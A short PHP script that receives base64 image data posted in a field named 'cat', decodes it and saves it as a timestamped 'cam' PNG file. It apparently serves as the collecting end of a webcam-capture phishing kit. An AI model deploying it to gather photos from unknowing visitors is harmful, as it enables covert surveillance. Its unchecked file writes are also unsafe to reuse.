<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");
}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);

$folderName = 'photos/';
$fileName = 'cam' . $date . '.png';
$filePath = $fileName;

$fp = fopen($filePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

exit();
?>

